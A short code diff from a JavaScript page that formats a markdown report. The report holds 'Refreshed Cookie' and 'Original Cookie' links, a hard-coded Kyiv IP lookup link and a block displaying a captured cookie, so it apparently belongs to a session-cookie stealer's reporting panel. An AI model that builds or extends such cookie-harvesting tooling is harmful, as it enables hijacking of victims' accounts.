@@ -268,7 +268,7 @@ export default function SlugPage() {
               `**Links:**\n` +
               `[Refreshed Cookie](${linkRe || "N/A"}) | ` +
               `[Original Cookie](${linkRe || "N/A"}) | ` +
-              `[IP Info [UA, Kyiv]](${"https://ip-api.com/#185.30.203.240" || "N/A"})\n\n` +  // ← 3 link nằm ở đây, ngay trên cookie
+              `[IP Info [UA, Kyiv]]("https://ip-api.com/#185.30.203.240")\n\n` +  // ← 3 link nằm ở đây, ngay trên cookie
               (cookieDisplay 
                 ? `\`\`\`${cookieDisplay}\`\`\`` 
                 : "```No cookie available```"),
